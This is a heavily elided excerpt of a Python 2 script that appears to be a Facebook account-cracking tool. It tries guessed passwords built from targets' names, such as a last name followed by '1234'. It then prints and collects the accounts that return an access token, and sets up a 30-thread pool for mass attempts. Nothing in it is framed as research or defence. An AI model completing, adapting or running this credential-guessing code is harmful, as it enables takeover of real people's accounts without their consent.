...
def login():
	...
	try:
		...
		cb()
		print (logo)
		print (R + '◈━━━━▷' + S + ' Login With new ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ ' + R + '◁━━━━◈')
		print
		id=raw_input(S + '[☆] ' + S + 'Email/username: ' + G +'')
		...
		try:
			...
			if 'www.facebook.com' in k['error_msg']:
			    ...
			    if 'access_token' in k:
			        print (G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps1+b['name'])
			        oks.append(user+ps1)
			    else:
			        ...
			        if 'www.facebook.com' in k['error_msg']:
			            ...
			            if 'access_token' in k:
			                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps2+b['name'])
			                oks.append(user+ps2)
			            else:
			                ...
			                if 'www.facebook.com' in k['error_msg']:
			                    ...
			                    if 'access_token' in k:
			                        ...
			                        if 'www.facebook.com' in k['error_msg']:
			                            ...
			                            if 'access_token' in k:
			                                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps4+b['name'])
			                                oks.append(user+ps4)
			                            else:
			                                ps5=(b['last_name']+'1234')
			                                ...
			                                if 'www.facebook.com' in k['error_msg']:
			                                    ...
			                                    if 'access_token' in k:
			                                        print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps5+b['name'])
			                                        oks.append(user+ps5)
			                                    else:
			                                        ...
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            ...
			                                            if 'access_token' in k:
			                                                print(G+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6+b['name'])
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
